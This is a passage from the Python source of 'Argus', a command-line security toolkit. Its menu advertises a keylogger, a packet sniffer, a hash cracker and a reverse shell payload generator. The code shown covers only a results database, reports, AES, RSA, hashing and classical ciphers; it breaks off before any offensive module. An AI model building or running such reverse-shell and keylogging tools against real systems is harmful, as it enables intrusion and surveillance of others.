"""
=============================================================
 Argus - Expanded Edition
 Author: Derian Farley
 Date:   May 2026
 Description:
   A command-line cybersecurity utility featuring:
     1. Crypto Toolkit       - AES-256 files, RSA, SHA hashing, substitution
     2. Password Generator   - create strong passwords with zxcvbn estimates
     3. Keylogger            - log your own keystrokes locally
     4. Packet Sniffer       - capture and inspect raw network packets
     5. Web Vuln Scanner     - check URLs for common misconfigurations
     6. Recon / Hash / Forensics helpers for CTFs and authorized testing

 ETHICAL USE NOTICE:
   Dual-use tools are for educational and personal-use only.
   Only run the keylogger on your own machine, the packet sniffer
   on networks you own or have explicit permission to monitor, and
   scanners/sweepers against targets you own or are authorized to test.
=============================================================

 DEPENDENCIES  (install once with pip):
   pip install pynput pyperclip scapy requests beautifulsoup4

   Optional capability packs:
     pip install rich cryptography zxcvbn dpkt fake-useragent
     pip install playwright sslyze wappalyzer-python dnspython
     pip install python-whois Pillow
     playwright install chromium

   Window-title tracking also needs:
     Windows  -> pip install pygetwindow
     Linux    -> sudo apt install xdotool
     macOS    -> no extra install (uses AppleScript)

   Packet sniffer on Linux/Mac requires root:
     sudo python argus.py
=============================================================
"""

from __future__ import annotations
from typing import Any, Iterator

import os
import re
import sys
import json
import base64
import random
import secrets
import string
import hashlib
import getpass
import sqlite3
import argparse
import datetime
import platform
import collections
import subprocess
import shutil
import socket
import ipaddress
import time


APP_VERSION = "4.0"
DB_FILE = "argus_results.db"

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import (
        track,
        Progress,
        SpinnerColumn,
        BarColumn,
        MofNCompleteColumn,
        TextColumn,
        TimeRemainingColumn,
    )
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    console = None


if os.name == "nt":
    os.system("")


STYLE_MAP = {
    "logo": ("bold bright_red", "1;91"),
    "danger": ("bold red", "1;31"),
    "ok": ("bold green", "1;32"),
    "warn": ("bold yellow", "1;33"),
    "info": ("bold cyan", "1;36"),
    "accent": ("bold magenta", "1;35"),
    "text": ("bold white", "1;37"),
    "muted": ("bright_black", "90"),
    "dim": ("dim white", "2;37"),
}


ARGUS_BANNER = r"""
    ___    ____  ________  _______
   /   |  / __ \/ ____/ / / / ___/
  / /| | / /_/ / / __/ / / /\__ \ 
 / ___ |/ _, _/ /_/ / /_/ /___/ / 
/_/  |_/_/ |_|\____/\____//____/  
""".strip("\n")

MENU_SECTIONS = [
    (
        "CRYPTOGRAPHY & ENCODING",
        [
            ("1", "Cryptography Toolkit", "AES-256, RSA, SHA, substitution"),
            ("2", "Password Generator", "zxcvbn strength estimate"),
            ("3", "Encoder / Decoder", "Base64, URL, Hex, ROT13, Binary, Morse, JWT"),
        ],
    ),
    (
        "NETWORK ANALYSIS",
        [
            ("4", "Packet Analysis", "live sniffing + PCAP + C2 beacon detection"),
        ],
    ),
    (
        "WEB APPLICATION TESTING",
        [
            ("5", "Web Vulnerability Scanner", "profiles + JSON export"),
            ("6", "HTTP Repeater", "craft & resend HTTP requests"),
            ("7", "Spider / Crawler", "map links, forms & endpoints"),
        ],
    ),
    (
        "HOST MONITORING",
        [
            ("8", "Keylogger", "own machine only"),
        ],
    ),
    (
        "RESULTS",
        [
            ("9", "Results Database", "saved scans, crawls & PCAP reports"),
        ],
    ),
    (
        "EXTRA TOOLBOX",
        [
            ("10", "Network & Recon Tools",      "ports, ping sweep, DNS, headers"),
            ("11", "Password & Hash Tools",      "hashes, cracker, HIBP"),
            ("12", "File & Forensics",           "metadata, stego, integrity"),
            ("13", "Authorized Lab Tester",      "passive discovery + harmless probes"),
            ("14", "OSINT Toolkit",              "domains, IPs, email, usernames, IOCs, batch"),
            ("15", "SSL/TLS Inspector",          "cert details, SANs, cipher analysis"),
            ("16", "Reverse Shell Generator",    "payloads for authorized lab use only"),
            ("17", "Directory Brute Forcer",     "discover hidden paths with a wordlist"),
            ("18", "Subdomain Enumerator",       "DNS wordlist bruteforce + CT log + HTTP probe"),
            ("19", "CVE / NVD Lookup",           "search NIST NVD by CVE-ID or keyword + EPSS score"),
            ("20", "Cloud Security Checker",     "probe AWS S3, Azure Blob, GCP for public buckets"),
        ],
    ),
    (
        "SYSTEM",
        [
            ("c", "Configure API Keys",       "set up argus_config.json interactively"),
        ],
    ),
]


def _ansi_enabled() -> bool:
    return os.environ.get("NO_COLOR") is None and sys.stdout.isatty()


def _ansi(text: str, role: str = "text") -> str:
    if not _ansi_enabled():
        return text
    code = STYLE_MAP.get(role, STYLE_MAP["text"])[1]
    return f"\033[{code}m{text}\033[0m"


def _style_from_role(role: str) -> str:
    return STYLE_MAP.get(role, STYLE_MAP["text"])[0]


def ui_print(text: str = "", role: str = "text") -> None:
    if RICH_AVAILABLE:
        console.print(text, style=_style_from_role(role))
    else:
        print(_ansi(text, role))


def ui_segments(segments: list[tuple[str, str]]) -> None:
    if RICH_AVAILABLE:
        for text, role in segments:
            console.print(text, style=_style_from_role(role), end="")
        console.print()
    else:
        print("".join(_ansi(text, role) for text, role in segments))


def ui_status(marker: str, message: str, marker_role: str = "ok", message_role: str = "text") -> None:
    ui_segments([(marker, marker_role), (" ", "muted"), (message, message_role)])


def ui_prompt(label: str = "argus") -> str:
    return _ansi(f"  {label} > ", "info")


def cprint(text: str = "", style: str | None = None) -> None:
    """Print with Rich when available, falling back to normal print."""
    if RICH_AVAILABLE:
        console.print(text, style=style)
    else:
        print(_ansi(text, _role_from_style(style)))


def print_rule(title: str) -> None:
    """Render a section rule that looks nice with or without Rich."""
    if RICH_AVAILABLE:
        console.print()
        console.rule(f"[bold cyan]{title}[/bold cyan]", style="bright_black")
    else:
        print()
        ui_print("-" * 66, "muted")
        ui_status("[+]", title, "ok", "info")
        ui_print("-" * 66, "muted")


def _role_from_style(style: str | None) -> str:
    if not style:
        return "text"
    style = str(style).lower()
    if "red" in style:
        return "danger"
    if "green" in style:
        return "ok"
    if "yellow" in style:
        return "warn"
    if "cyan" in style or "blue" in style:
        return "info"
    if "magenta" in style:
        return "accent"
    if "dim" in style or "black" in style:
        return "muted"
    return "text"


def _dependency_hint(package_name: str, install_name: str | None = None) -> str:
    install_name = install_name or package_name
    return f"pip install {install_name}"

def _safe_slug(value: str, default: str = "scan") -> str:
    """Return a filesystem-safe slug for filenames."""
    value = (value or "").strip()
    if not value:
        return default
    cleaned = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in value)
    cleaned = cleaned.strip("._")
    return cleaned or default


def _normalize_url(raw_url: str) -> str:
    """Add https:// when no scheme is supplied and return a clean URL."""
    raw_url = (raw_url or "").strip()
    if not raw_url:
        return raw_url
    if not raw_url.startswith(("http://", "https://")):
        raw_url = "https://" + raw_url
    return raw_url


def _issue_to_dict(issue: "Issue") -> dict[str, str | None]:
    return {
        "severity": issue.severity,
        "category": issue.category,
        "title": issue.title,
        "detail": issue.detail,
        "fix": issue.fix,
    }


def _issue_severity_counts(issues: list["Issue"]) -> dict[str, int]:
    return {sev: sum(1 for issue in issues if issue.severity == sev) for sev in SEV_ORDER}



def _init_db() -> None:
    """Create the local SQLite results database if it does not exist."""
    conn = sqlite3.connect(DB_FILE)
    try:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS tool_runs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                tool TEXT NOT NULL,
                target TEXT,
                started_at TEXT NOT NULL,
                summary TEXT,
                report TEXT
            )
            """
        )
        conn.commit()
    finally:
        conn.close()


def _save_tool_run(tool: str, target: str | None = None, summary: str | None = None, report: str | None = None) -> int | None:
    """Persist a scan/crawl/analysis result for later comparison."""
    try:
        _init_db()
        conn = sqlite3.connect(DB_FILE)
        try:
            cur = conn.execute(
                """
                INSERT INTO tool_runs(tool, target, started_at, summary, report)
                VALUES (?, ?, ?, ?, ?)
                """,
                (
                    tool,
                    target,
                    datetime.datetime.now().isoformat(timespec="seconds"),
                    summary,
                    report,
                ),
            )
            conn.commit()
            return cur.lastrowid
        finally:
            conn.close()
    except sqlite3.Error as e:
        print(f"  [!] Could not save to SQLite database: {e}")
        return None


def _render_html_report(row: dict) -> str:
    """
    Convert a plain-text tool run report into a self-contained HTML page
    with severity-coloured rows and a clean monospace layout.
    """
    import html as _html

    SEV_COLOURS = {
        "CRITICAL": "#c0392b",
        "HIGH":     "#e67e22",
        "MEDIUM":   "#f1c40f",
        "LOW":      "#2980b9",
        "INFO":     "#27ae60",
        "[!]":      "#c0392b",
        "[+]":      "#27ae60",
        "[*]":      "#2980b9",
    }

    def colour_line(raw_line: str) -> str:
        escaped = _html.escape(raw_line)
        for keyword, colour in SEV_COLOURS.items():
            if keyword in raw_line:
                return f'<span style="color:{colour};font-weight:bold">{escaped}</span>'
        return escaped

    report_text = row.get("report") or "(No report stored.)"
    coloured_lines = "\n".join(colour_line(ln) for ln in report_text.splitlines())

    title   = _html.escape(f"{row['tool']} — {row['target'] or '(no target)'}")
    started = _html.escape(row.get("started_at") or "")
    summary = _html.escape(row.get("summary") or "")

    summary_block = f'<div class="summary">Summary: {summary}</div>' if summary else ""

    return (
        "<!DOCTYPE html>\n"
        "<html lang=\"en\">\n"
        "<head>\n"
        "  <meta charset=\"UTF-8\">\n"
        "  <title>Argus Report</title>\n"
        "  <style>\n"
        "    * { box-sizing: border-box; margin: 0; padding: 0; }\n"
        "    body { background:#0d1117; color:#c9d1d9; font-family:'Courier New',monospace;"
        " font-size:13px; padding:32px; line-height:1.6; }\n"
        "    header { border-bottom:1px solid #30363d; margin-bottom:24px; padding-bottom:16px; }\n"
        "    h1 { color:#58a6ff; font-size:18px; margin-bottom:6px; }\n"
        "    .meta { color:#8b949e; font-size:12px; }\n"
        "    .summary { background:#161b22; border:1px solid #30363d; border-radius:6px;"
        " padding:12px 16px; margin-bottom:20px; color:#79c0ff; }\n"
        "    pre { background:#161b22; border:1px solid #30363d; border-radius:6px;"
        " padding:20px; overflow-x:auto; white-space:pre-wrap; word-break:break-all; }\n"
        "    footer { margin-top:24px; color:#8b949e; font-size:11px; text-align:center; }\n"
        "  </style>\n"
        "</head>\n"
        "<body>\n"
        "  <header>\n"
        f"    <h1>&#x1F6E1; Argus Security Report</h1>\n"
        f"    <div class=\"meta\">Tool: {title} &nbsp;|&nbsp; Run: {started}</div>\n"
        "  </header>\n"
        f"  {summary_block}\n"
        f"  <pre>{coloured_lines}</pre>\n"
        "  <footer>Generated by Argus &mdash; authorised use only</footer>\n"
        "</body>\n"
        "</html>"
    )


def run_results_database() -> None:
    """Browse, compare, and export SQLite-backed results."""
    _init_db()

    def show_recent_runs() -> None:
        conn = sqlite3.connect(DB_FILE)
        try:
            rows = conn.execute(
                """
                SELECT id, tool, target, started_at, summary
                FROM tool_runs
                ORDER BY id DESC
                LIMIT 25
                """
            ).fetchall()
        finally:
            conn.close()

        print_rule("Results Database")
        print(f"  Database: {DB_FILE}")
        print()
        if not rows:
            print("  No saved results yet.")
            return

        if RICH_AVAILABLE:
            table = Table(title="Recent Tool Runs")
            table.add_column("ID", justify="right")
            table.add_column("Tool")
            table.add_column("Target")
            table.add_column("Started")
            table.add_column("Summary")
            for row in rows:
                table.add_row(str(row[0]), row[1], row[2] or "", row[3], row[4] or "")
            console.print(table)
        else:
            for run_id, tool, target, started_at, summary in rows:
                print(f"  #{run_id:<4} {started_at:<19} {tool:<14} {target or '-'}")
                if summary:
                    print(f"       {summary}")

    while True:
        print_rule("Results Database")
        print("  1. Browse recent runs")
        print("  2. Compare two runs")
        print("  3. Export a run to a text file (.txt)")
        print("  4. Export a run to an HTML report (.html)")
        print("  q. Back")
        choice = input("  Choice: ").strip().lower()

        if choice == "1":
            show_recent_runs()
            raw = input("  Enter a result ID to view full report, or press Enter: ").strip()
            if raw.isdigit():
                row = _fetch_tool_run(int(raw))
                if row:
                    print()
                    print("=" * 70)
                    print(f"  {row['tool']}  |  {row['target'] or '-'}  |  {row['started_at']}")
                    print("=" * 70)
                    print(row['report'] or "(No full report stored.)")
                    print("=" * 70)
                else:
                    print("  [!] Result ID not found.")
            input("Press Enter to return to the menu...")

        elif choice == "2":
            left = input("  First result ID: ").strip()
            right = input("  Second result ID: ").strip()
            if not (left.isdigit() and right.isdigit()):
                print("  [!] Please enter two numeric IDs.")
                input("Press Enter to return...")
                continue
            run_a = _fetch_tool_run(int(left))
            run_b = _fetch_tool_run(int(right))
            if not run_a or not run_b:
                print("  [!] One or both result IDs were not found.")
                input("Press Enter to return...")
                continue
            comparison = _compare_tool_run_reports(run_a, run_b)
            print()
            print("=" * 70)
            print("  Result Comparison")
            print("=" * 70)
            print(comparison)
            print("=" * 70)
            input("Press Enter to return...")

        elif choice == "3":
            raw = input("  Result ID to export: ").strip()
            if not raw.isdigit():
                print("  [!] Please enter a numeric ID.")
                input("Press Enter to return...")
                continue
            row = _fetch_tool_run(int(raw))
            if not row:
                print("  [!] Result ID not found.")
                input("Press Enter to return...")
                continue
            default_name = f"toolrun_{row['id']}.txt"
            output = input(f"  Output filename [{default_name}]: ").strip() or default_name
            try:
                with open(output, "w", encoding="utf-8") as f:
                    f.write(row['report'] or "(No full report stored.)")
                print(f"  [+] Exported to {output}")
            except OSError as e:
                print(f"  [!] Could not export report: {e}")
            input("Press Enter to return...")

        elif choice == "4":
            raw = input("  Result ID to export: ").strip()
            if not raw.isdigit():
                print("  [!] Please enter a numeric ID.")
                input("Press Enter to return...")
                continue
            row = _fetch_tool_run(int(raw))
            if not row:
                print("  [!] Result ID not found.")
                input("Press Enter to return...")
                continue
            default_name = f"toolrun_{row['id']}.html"
            output = input(f"  Output filename [{default_name}]: ").strip() or default_name
            if not output.lower().endswith(".html"):
                output += ".html"
            try:
                html = _render_html_report(row)
                with open(output, "w", encoding="utf-8") as f:
                    f.write(html)
                print(f"  [+] HTML report written to {output}")
            except OSError as e:
                print(f"  [!] Could not write file: {e}")
            input("Press Enter to return...")

        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")



# ─────────────────────────────────────────────
#  SUBSTITUTION CIPHER
# ─────────────────────────────────────────────

ALPHABET   = string.ascii_lowercase
CIPHER_KEY = "zyxwvutsrqponmlkjihgfedcba"


def encrypt_text(plaintext: str) -> str:
    """Encrypt using a reverse-alphabet substitution cipher."""
    ciphertext = ""
    for char in plaintext:
        if char.islower():
            ciphertext += CIPHER_KEY[ALPHABET.index(char)]
        elif char.isupper():
            ciphertext += CIPHER_KEY[ALPHABET.index(char.lower())].upper()
        else:
            ciphertext += char
    return ciphertext


def decrypt_text(ciphertext: str) -> str:
    """Decrypt (reverse alphabet is its own inverse)."""
    return encrypt_text(ciphertext)


def run_substitution_cipher() -> None:
    """
    Monoalphabetic substitution cipher — encrypt or decrypt text and files.

    Prompts the user to supply a 26-letter key that maps each plaintext
    letter A-Z to a ciphertext letter.  Supports both typed text and
    file-based input, saving the result alongside the original.
    """
    print("\n" + "=" * 40)
    print("   Substitution Cipher")
    print("=" * 40)
    print("1. Encrypt/Decrypt typed text")
    print("2. Encrypt/Decrypt a text file and save output")
    print("\n  Note: this is a toy substitution cipher.")
    print("  Use AES-256 for real file encryption.")

    while True:
        choice = input("\nEnter your choice (1 or 2): ").strip()
        if choice in ("1", "2"):
            break
        print("  [!] Invalid choice. Please enter 1 or 2.")

    while True:
        mode = input("  (e)ncrypt or (d)ecrypt? ").strip().lower()
        if mode in ("e", "d"):
            break
        print("  [!] Enter 'e' or 'd'.")

    action = "Encrypted" if mode == "e" else "Decrypted"
    filename = None

    if choice == "1":
        plaintext = input(f"\nEnter the text to {action.lower()}: ")
    else:
        while True:
            filename = input("\nEnter the filename (e.g. message.txt): ").strip()
            if not filename:
                print("  [!] Filename cannot be empty.")
                continue
            if not os.path.exists(filename):
                print(f"  [!] File '{filename}' not found.")
                continue
            # encoding="utf-8" prevents UnicodeDecodeError on non-ASCII files.
            # errors="replace" substitutes ? for any byte that still can't decode
            # instead of crashing. The try/except catches permission errors,
            # locked files, and any other OS-level failure.
            try:
                with open(filename, "r", encoding="utf-8", errors="replace") as f:
                    plaintext = f.read()
            except OSError as e:
                print(f"  [!] Could not read file: {e}")
                continue
            break

    print("\n" + "-" * 40)
    print("Input Text:")
    print(f"  {plaintext}")
    result_text = encrypt_text(plaintext)
    print(f"\n{action} Output:")
    print(f"  {result_text}")

    if filename:
        default_output = (
            filename + ".sub.enc"
            if mode == "e"
            else filename[:-8] if filename.lower().endswith(".sub.enc") else filename + ".sub.dec"
        )
        output_file = input(f"\nSave output file [{default_output}]: ").strip() or default_output
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(result_text)
            print(f"  [+] {action} file saved to '{output_file}'")
            print(f"  [*] Original file was left unchanged: '{filename}'")
        except OSError as e:
            print(f"  [!] Could not save output file: {e}")

    print("-" * 40)
    input("\nPress Enter to return to the main menu...")


def _require_cryptography() -> bool:
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding, rsa
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        return {
            "hashes": hashes,
            "serialization": serialization,
            "padding": padding,
            "rsa": rsa,
            "AESGCM": AESGCM,
            "PBKDF2HMAC": PBKDF2HMAC,
        }
    except ImportError:
        print("\n  [!] cryptography is not installed.")
        print("      Run:  pip install cryptography")
        return None


def _derive_aes_key(password: str, salt: bytes) -> bytes:
    crypto = _require_cryptography()
    if not crypto:
        return None
    kdf = crypto["PBKDF2HMAC"](
        algorithm=crypto["hashes"].SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
    )
    return kdf.derive(password.encode("utf-8"))


def run_aes_file_crypto() -> None:
    """Encrypt/decrypt files with AES-256-GCM and a password-derived key."""
    crypto = _require_cryptography()
    if not crypto:
        input("\nPress Enter to return...")
        return

    AESGCM = crypto["AESGCM"]
    MAGIC = b"ARGUS-AESGCM1"

    print_rule("AES-256 File Encryption")
    print("  Uses AES-256-GCM with PBKDF2-HMAC-SHA256 key derivation.")
    print("  Keep your password safe; there is no recovery path.\n")

    while True:
        mode = input("  (e)ncrypt or (d)ecrypt? ").strip().lower()
        if mode in ("e", "d"):
            break
        print("  [!] Enter 'e' or 'd'.")

    source = input("  Input file path: ").strip().strip('"')
    if not os.path.isfile(source):
        print("  [!] File not found.")
        input("\nPress Enter to return...")
        return

    if mode == "e":
        dest = input("  Output file path (default: input.arg): ").strip().strip('"')
        if not dest:
            dest = source + ".arg"
        if os.path.exists(dest):
            ans = input(f"  [!] '{dest}' already exists. Overwrite? (y/n): ").strip().lower()
            if ans != "y":
                print("  [*] Aborted.")
                input("\nPress Enter to return...")
                return
        password = getpass.getpass("  Password: ")
        confirm = getpass.getpass("  Confirm : ")
        if password != confirm:
            print("  [!] Passwords do not match.")
            input("\nPress Enter to return...")
            return

        salt = secrets.token_bytes(16)
        nonce = secrets.token_bytes(12)
        key = _derive_aes_key(password, salt)
        if not key:
            input("\nPress Enter to return...")
            return
        with open(source, "rb") as f:
            plaintext = f.read()
        ciphertext = AESGCM(key).encrypt(nonce, plaintext, None)
        with open(dest, "wb") as f:
            f.write(MAGIC + salt + nonce + ciphertext)
        print(f"  [+] Encrypted {len(plaintext):,} bytes -> {dest}")
        print(f"  [*] Original file was left unchanged: {source}")
        print("  [*] Open the .arg output file to see the encrypted bytes.")

    else:
        dest = input("  Output file path (default: remove .arg): ").strip().strip('"')
        if not dest:
            dest = source[:-4] if source.lower().endswith(".arg") else source + ".dec"
        if os.path.exists(dest):
            ans = input(f"  [!] '{dest}' already exists. Overwrite? (y/n): ").strip().lower()
            if ans != "y":
                print("  [*] Aborted.")
                input("\nPress Enter to return...")
                return
        password = getpass.getpass("  Password: ")
        with open(source, "rb") as f:
            blob = f.read()
        if not blob.startswith(MAGIC) or len(blob) <= len(MAGIC) + 28:
            print("  [!] Not an Argus AES-GCM file.")
            input("\nPress Enter to return...")
            return
        offset = len(MAGIC)
        salt = blob[offset:offset + 16]
        nonce = blob[offset + 16:offset + 28]
        ciphertext = blob[offset + 28:]
        key = _derive_aes_key(password, salt)
        if not key:
            input("\nPress Enter to return...")
            return
        try:
            plaintext = AESGCM(key).decrypt(nonce, ciphertext, None)
        except Exception:
            print("  [!] Decryption failed. Password or file contents are wrong.")
            input("\nPress Enter to return...")
            return
        with open(dest, "wb") as f:
            f.write(plaintext)
        print(f"  [+] Decrypted {len(plaintext):,} bytes -> {dest}")

    input("\nPress Enter to return...")


def run_rsa_crypto() -> None:
    """Generate RSA keys and encrypt/decrypt short text with OAEP-SHA256."""
    crypto = _require_cryptography()
    if not crypto:
        input("\nPress Enter to return...")
        return

    serialization = crypto["serialization"]
    rsa = crypto["rsa"]
    padding = crypto["padding"]
    hashes = crypto["hashes"]

    print_rule("RSA Toolkit")
    print("  RSA is best for small secrets or wrapping keys, not large files.\n")
    print("  1. Generate RSA keypair")
    print("  2. Encrypt text with public key")
    print("  3. Decrypt text with private key")
    choice = input("\n  Choice: ").strip()

    if choice == "1":
        raw_bits = input("  Key size (3072 or 4096, default 3072): ").strip() or "3072"
        bits = 4096 if raw_bits == "4096" else 3072
        private_path = input("  Private key output [rsa_private.pem]: ").strip() or "rsa_private.pem"
        public_path = input("  Public key output  [rsa_public.pem] : ").strip() or "rsa_public.pem"
        passphrase = getpass.getpass("  Private-key passphrase (blank for none): ")

        private_key = rsa.generate_private_key(public_exponent=65537, key_size=bits)
        encryption = (
            serialization.BestAvailableEncryption(passphrase.encode("utf-8"))
            if passphrase else serialization.NoEncryption()
        )
        private_pem = private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            encryption,
        )
        public_pem = private_key.public_key().public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        with open(private_path, "wb") as f:
            f.write(private_pem)
        with open(public_path, "wb") as f:
            f.write(public_pem)
        print(f"  [+] Wrote {private_path} and {public_path}")

    elif choice == "2":
        public_path = input("  Public key path: ").strip().strip('"')
        if not os.path.isfile(public_path):
            print(f"  [!] File not found: {public_path}")
            input("\nPress Enter to return...")
            return
        try:
            with open(public_path, "rb") as f:
                public_key = serialization.load_pem_public_key(f.read())
        except Exception as e:
            print(f"  [!] Could not load public key: {e}")
            input("\nPress Enter to return...")
            return
        max_bytes = (public_key.key_size // 8) - 66   # OAEP-SHA256 overhead
        print(f"  [*] Key size: {public_key.key_size} bits  |  Max plaintext: {max_bytes} bytes")
        plaintext = input("  Text to encrypt: ").encode("utf-8")
        if len(plaintext) > max_bytes:
            print(f"  [!] Input is {len(plaintext)} bytes -- exceeds RSA-OAEP limit of {max_bytes} bytes.")
            print("      Use AES-256 for large data and RSA to wrap the AES key.")
            input("\nPress Enter to return...")
            return
        try:
            ciphertext = public_key.encrypt(
                plaintext,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
        except Exception as e:
            print(f"  [!] Encryption failed: {e}")
            input("\nPress Enter to return...")
            return
        print("\n  Ciphertext (Base64):")
        print("  " + base64.b64encode(ciphertext).decode("ascii"))

    elif choice == "3":
        private_path = input("  Private key path: ").strip().strip('"')
        if not os.path.isfile(private_path):
            print(f"  [!] File not found: {private_path}")
            input("\nPress Enter to return...")
            return
        b64_ciphertext = input("  Ciphertext (Base64): ").strip()
        passphrase = getpass.getpass("  Private-key passphrase (blank if none): ")
        try:
            with open(private_path, "rb") as f:
                private_key = serialization.load_pem_private_key(
                    f.read(),
                    password=passphrase.encode("utf-8") if passphrase else None,
                )
        except ValueError as e:
            print(f"  [!] Could not load private key (wrong passphrase?): {e}")
            input("\nPress Enter to return...")
            return
        except Exception as e:
            print(f"  [!] Could not load private key: {e}")
            input("\nPress Enter to return...")
            return
        try:
            raw_ciphertext = base64.b64decode(b64_ciphertext)
        except Exception:
            print("  [!] Invalid Base64 -- paste the ciphertext exactly as shown during encryption.")
            input("\nPress Enter to return...")
            return
        try:
            plaintext = private_key.decrypt(
                raw_ciphertext,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
        except Exception as e:
            print(f"  [!] Decryption failed (wrong key or corrupted data): {e}")
            input("\nPress Enter to return...")
            return
        print("\n  Plaintext:")
        print("  " + plaintext.decode("utf-8", errors="replace"))

    else:
        print("  [!] Invalid choice.")

    input("\nPress Enter to return...")


def run_sha_hashing() -> None:
    """Hash text or files with SHA-family and modern hashlib algorithms."""
    algorithms = [
        "sha1", "sha224", "sha256", "sha384", "sha512",
        "sha3_256", "sha3_512", "blake2b",
    ]
    print_rule("SHA Hashing")
    for i, name in enumerate(algorithms, 1):
        print(f"  {i}. {name}")
    raw = input("\n  Algorithm [sha256]: ").strip()
    if raw.isdigit() and 1 <= int(raw) <= len(algorithms):
        algorithm = algorithms[int(raw) - 1]
    elif raw in algorithms:
        algorithm = raw
    else:
        algorithm = "sha256"

    if algorithm == "sha1":
        print("  [!] SHA-1 is legacy and collision-prone. Prefer SHA-256 or SHA-3.")

    while True:
        mode = input("  Hash (t)ext or (f)ile? ").strip().lower()
        if mode in ("t", "f"):
            break
        print("  [!] Enter 't' or 'f'.")

    h = hashlib.new(algorithm)
    if mode == "t":
        text = input("  Text: ")
        h.update(text.encode("utf-8"))
        target = "typed text"
    else:
        path = input("  File path: ").strip().strip('"')
        if not os.path.isfile(path):
            print("  [!] File not found.")
            input("\nPress Enter to return...")
            return
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1024 * 1024), b""):
                h.update(chunk)
        target = path

    print("\n" + "-" * 64)
    print(f"  Algorithm : {algorithm}")
    print(f"  Target    : {target}")
    print(f"  Digest    : {h.hexdigest()}")
    print("-" * 64)
    input("\nPress Enter to return...")


def _vigenere_transform(text: str, keyword: str, decrypt: bool = False) -> str:
    keyword_shifts = [
        ord(ch.lower()) - ord("a")
        for ch in keyword
        if ch.isalpha()
    ]
    if not keyword_shifts:
        raise ValueError("Keyword must contain at least one letter.")

    out = []
    key_index = 0
    for ch in text:
        if ch.isalpha():
            base = ord("A") if ch.isupper() else ord("a")
            shift = keyword_shifts[key_index % len(keyword_shifts)]
            if decrypt:
                shift = -shift
            out.append(chr((ord(ch) - base + shift) % 26 + base))
            key_index += 1
        else:
            out.append(ch)
    return "".join(out)


def run_vigenere_cipher() -> None:
    """Keyword-based polyalphabetic cipher for CTF practice."""
    print_rule("Vigenere Cipher")
    while True:
        mode = input("  (e)ncrypt or (d)ecrypt? ").strip().lower()
        if mode in ("e", "d"):
            break
        print("  [!] Enter 'e' or 'd'.")
    keyword = input("  Keyword: ").strip()
    text = input("  Text: ")
    try:
        result = _vigenere_transform(text, keyword, decrypt=(mode == "d"))
    except ValueError as e:
        print(f"  [!] {e}")
        input("\nPress Enter to return...")
        return
    print("\n" + "-" * 60)
    print(f"  Output: {result}")
    print("-" * 60)
    input("\nPress Enter to return...")


def _caesar_shift(text: str, shift: int) -> str:
    out = []
    for ch in text:
        if ch.isalpha():
            base = ord("A") if ch.isupper() else ord("a")
            out.append(chr((ord(ch) - base + shift) % 26 + base))
        else:
            out.append(ch)
    return "".join(out)


def _english_score(text: str) -> float:
    lower = text.lower()
    score = 0
    common_words = [" the ", " and ", " to ", " of ", " in ", " is ", " that ", " you "]
    for word in common_words:
        score += lower.count(word) * 8
    expected = "etaoinshrdlu"
    for i, ch in enumerate(expected):
        score += lower.count(ch) * (len(expected) - i)
    score += sum(1 for ch in lower if ch in " .,;:'\"!?") * 0.5
    score -= sum(1 for ch in lower if ord(ch) < 32 and ch not in "\r\n\t") * 10
    return score


def run_caesar_bruteforcer() -> None:
    """Try every Caesar shift and rank likely English plaintext."""
    print_rule("Caesar Brute-Forcer")
    ciphertext = input("  Ciphertext: ")
    candidates = []
    for shift in range(1, 26):
        candidate = _caesar_shift(ciphertext, shift)
        candidates.append((shift, _english_score(candidate), candidate))
    candidates.sort(key=lambda row: row[1], reverse=True)

    print("\n  Best guesses:")
    print("  " + "-" * 70)
    for shift, score, candidate in candidates[:5]:
        print(f"  shift={shift:>2} score={score:>7.1f}  {candidate[:90]}")
    print("\n  All shifts:")
    for shift, _score, candidate in sorted(candidates):
        print(f"  {shift:>2}: {candidate}")
    input("\nPress Enter to return...")


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("XOR key cannot be empty.")
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def run_xor_cipher() -> None:
    """XOR text or file bytes with a repeating key."""
    print_rule("XOR Cipher")
    print("  Useful for CTFs and malware-obfuscation practice. Same operation reverses it.\n")
    while True:
        mode = input("  Process (t)ext or (f)ile? ").strip().lower()
        if mode in ("t", "f"):
            break
        print("  [!] Enter 't' or 'f'.")
    key = input("  XOR key: ").encode("utf-8")
    if not key:
        print("  [!] Key cannot be empty.")
        input("\nPress Enter to return...")
        return

    if mode == "t":
        text = input("  Text: ")
        result = _xor_bytes(text.encode("utf-8"), key)
        print("\n  Output hex:")
        print("  " + result.hex())
        print("\n  Output base64:")
        print("  " + base64.b64encode(result).decode("ascii"))
        try:
            print("\n  Output text:")
            print("  " + result.decode("utf-8"))
        except UnicodeDecodeError:
            print("\n  Output text: (not valid UTF-8)")
    else:
        src = input("  Input file path: ").strip().strip('"')
        if not os.path.isfile(src):
            print("  [!] File not found.")
            input("\nPress Enter to return...")
            return
        dst = input("  Output file path [input.xor]: ").strip().strip('"') or (src + ".xor")
        with open(src, "rb") as f:
            data = f.read()
        result = _xor_bytes(data, key)
        with open(dst, "wb") as f:
            f.write(result)
        print(f"  [+] Wrote {len(result):,} bytes to {dst}")
    input("\nPress Enter to return...")


# ── English letter frequency table (for XOR scoring) ─────────────────────
